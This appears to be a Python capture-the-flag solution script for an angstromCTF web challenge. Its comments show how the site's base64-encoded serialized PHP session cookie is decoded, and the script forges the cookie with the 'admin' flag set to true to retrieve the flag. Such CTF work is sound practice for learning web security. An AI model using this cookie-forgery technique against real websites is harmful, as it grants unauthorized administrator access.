#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-04-16 08:59:00
# @Last Modified by:   john
# @Last Modified time: 2016-04-16 09:02:01


import requests

url = 'http://web.angstromctf.com:1339/'

# The original cookie is this:
# not_a_pastry: Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjA4MTEzMTg7czo1OiJhZG1pbiI7YjowO30=
# Which base64 decodes into...
#  'O:7:"Session":2:{s:10:"start_time";i:1460811318;s:5:"admin";b:0;}'
#
# So all we have to do is change that `admin` value to a 1 and then
# base64 our own new cookie. Then just send that value!

# base64.b64encode('O:7:"Session":2:{s:10:"start_time";i:1460811318;s:5:"admin";b:1;}')
# 'Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjA4MTEzMTg7czo1OiJhZG1pbiI7YjoxO30='


s = requests.Session()
response = requests.get(url, cookies={'not_a_pastry': 'Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjA4MTEzMTg7czo1OiJhZG1pbiI7YjoxO30='})

content = response.text

print content.split('\n')[-1].split(' ')[-1].replace('</html>', '')
